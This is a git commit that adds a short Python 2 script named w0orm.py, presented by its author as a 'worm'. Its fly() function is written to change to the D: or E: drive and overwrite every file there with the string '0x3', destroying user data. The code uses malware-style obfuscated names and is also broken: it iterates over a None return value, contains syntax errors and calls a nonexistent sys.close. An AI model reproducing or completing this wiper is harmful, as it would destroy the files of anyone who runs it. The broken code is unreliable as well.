63d8ba0d597521cab486302ad17d7d5554cf2e63
Razyar Saeedian <razyarsaeedian@gmail.com>
2022-07-15 23:34:47 +0430

    The one and only real dragon

---
+++ w0orm.py
@@ -0,0 +1,42 @@
+'''
+i use that name from 2015 until now :)
+
+'''
+
+import os, sys
+
+
+_0x3w0orm_ver = 0.3 # :D
+_0x3PATH = os.getcwd()
+
+def fly(_0x3_execute=0):
+	if _0x3_execute:
+		#need to creat buff from -> Dracarys.py 
+		try:
+			_0x3PATH_W = os.chdir('D:')
+			for _0x3_W in _0x3PATH_W:
+				_0x3_F = open(_0x3_W, 'w'):
+				try:
+					_0x3_F.write('0x3')
+					_0x3_F.close()
+					print 'Done: %s' % _0x3_W
+				except Exception as _0x3_Derr:
+					print _0x3_Derr
+					pass	
+		except:
+			_0x3PATH_W = os.chdir('E:')
+			for _0x3_W in _0x3PATH_W:
+				_0x3_F = open(_0x3_W, 'w'):
+				try:
+					_0x3_F.write('0x3')
+					_0x3_F.close()
+					print 'Done: %s' % _0x3_W
+				except Exception as _0x3_Eerr:
+					print _0x3_Eerr
+					pass
+
+	else:
+		sys.close('execute must be 0')
+
+
+#Other funcs will be added..
